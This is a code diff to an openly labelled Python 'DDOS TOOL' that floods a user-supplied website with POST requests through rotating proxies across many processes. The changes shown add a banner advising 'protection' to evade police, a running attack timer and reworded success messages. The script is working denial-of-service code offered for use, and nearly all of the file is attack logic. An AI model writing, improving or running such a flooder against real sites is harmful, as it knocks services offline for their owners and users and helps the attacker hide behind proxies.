@@ -4,14 +4,11 @@ import requests
 import os
 import random
 import time
-import signal
 from colorama import init, Fore, Style
-from tqdm import tqdm  # Progress bar library
+from tqdm import tqdm
 
 init(autoreset=True)
 
-
-# Improved banner with slight animation for a hacky vibe
 def logo():
     banner = r'''
         __________________________________________________
@@ -29,13 +26,29 @@ def logo():
 
                             DDOS  TOOL
                 we do bad things for good reasons 
-           --------------------------------------------
+    -------------------------------------------------------
+        ⚠️ --> REMEMBER USING PROTECTION DUDE OTHERWISE 👮
+        ⚠️ --> THIS TOOL REQUIRES HEAVY PROCESSORS      😭
+        ⚠️ --> THE SIZE OF WORKING PROXIES.TXT MATTERS  🧠
+    _______________________________________________________
     '''
     for line in banner.splitlines():
         print(Fore.RED + line)
         time.sleep(0.5)  # Adds delay to give it a more "hacker terminal" feel
     print('\n')
 
+def hacky_timer(start_time, link):
+    while True:
+        elapsed_time = time.time() - start_time
+        days, remainder = divmod(elapsed_time, 86400)
+        hours, remainder = divmod(remainder, 3600)
+        minutes, seconds = divmod(remainder, 60)
+        timer_str = (
+            f"{Fore.LIGHTCYAN_EX}⟬☠️⟭> Time: {int(days)} days, "
+            f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d} ⏳"
+        )
+        print(f"\r{timer_str}\n😜Ping >> [{link}] to find JOY", end="", flush=True)  # Use carriage return to overwrite the line
+        time.sleep(1800)
 
 def load_proxies_from_file(file_path='working_proxies.txt'):
     try:
@@ -47,9 +60,9 @@ def load_proxies_from_file(file_path='working_proxies.txt'):
         print(f"[❌] Proxy file {file_path} not found.\n")
         return []
 
-
 # Adding progress bar and using cleaner output formatting
 def send_request(link, proxy):
+
     url = f"https://{link}"
     headers = {
         'User-Agent': 'Mozilla/5.0',
@@ -60,15 +73,15 @@ def send_request(link, proxy):
         response = requests.post(url, headers=headers, proxies=proxies, timeout=5)
         if response:
             if response.status_code == 200:
-                print(f"⟬☠️⟭> {Fore.LIGHTCYAN_EX}{Style.BRIGHT}Request to [{link}] via proxy [{proxy}] Got in! 👹 \n")
+                print(f"⟬☠️⟭> {Fore.LIGHTCYAN_EX}{Style.BRIGHT}[{link}😭]-->Proxy [{proxy}] Got in Fully! 👹 \n")
             else:
                 print(
-                    f"⟬☠️⟭> {Fore.RED}Request to [{link}] via proxy [{proxy}] failed with status code: {response.status_code}\n")
+                    f"⟬☠️⟭> {Fore.RED}[{link}😭]-->Proxy [{proxy}] failed 👎")#with status code: {response.status_code}\n")
         else:
-            print(f"⟬☠️⟭> {Fore.YELLOW}Request to [{link}] via proxy [{proxy}] succeeded but no response returned!\n")
+            print(f"⟬☠️⟭> {Fore.LIGHTGREEN_EX}[{link}😭]-->Proxy [{proxy}] Succeeded No Response 🔥\n")
     except requests.RequestException:
-        print(f"⟬☠️⟭> {Fore.GREEN}[{link}😭]-->Proxy [{proxy}] Wait i Got it! 🔥\n")
-
+        #print(f"⟬☠️⟭> {Fore.GREEN}[{link}😭]-->Proxy [{proxy}] Wait i Got it! 🔥\n")
+        pass
 
 def load_test(link, proxies, num_threads):
     progress = tqdm(total=num_threads, desc="🔥 Attacking", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}\n")
@@ -80,24 +93,20 @@ def load_test(link, proxies, num_threads):
             progress.update(1)
         progress.close()
 
-
 def clear_screen():
     if os.name == 'nt':
         os.system('cls')
     else:
         os.system('clear')
 
-
 def terminate_all_processes(processes):
-    print(f"{Fore.RED}\n⟬☠️⟭> Terminating all processes...")
+    print(f"{Fore.GREEN}\n⟬☠️⟭> Terminating all processes...")
     for process in processes:
         process.terminate()  # Terminate all running processes
         process.join()  # Ensure they are fully stopped
     print(f"{Fore.RED}⟬☠️⟭> All processes terminated.")
 
-
 def main():
-    clear_screen()
     logo()
 
     link = input("⟬☠️⟭>>Enter the Website link [e.g example.com]:  ")
@@ -111,6 +120,10 @@ def main():
     proxies = load_proxies_from_file('working_proxies.txt')
     if not proxies:
         return
+    # Start the hacky timer in a separate thread after user confirmation
+    start_time = time.time()
+    timer_thread = threading.Thread(target=hacky_timer, args=(start_time,link), daemon=True)
+    timer_thread.start()
 
     processes = []
 
@@ -131,13 +144,12 @@ def main():
             process.join()
 
     except KeyboardInterrupt:
-        print(f"{Fore.RED}\n⟬☠️⟭> Attack terminated by user (Ctrl+C). Exiting...\n")
+        print(f"{Fore.GREEN}\n⟬☠️⟭> Attack terminated by user (Ctrl+C). Exiting...\n")
         terminate_all_processes(processes)  # Terminate all child processes when interrupted
 
     finally:
         if processes:
             terminate_all_processes(processes)  # Ensure clean termination on exit
-
 
 if __name__ == "__main__":
     main()
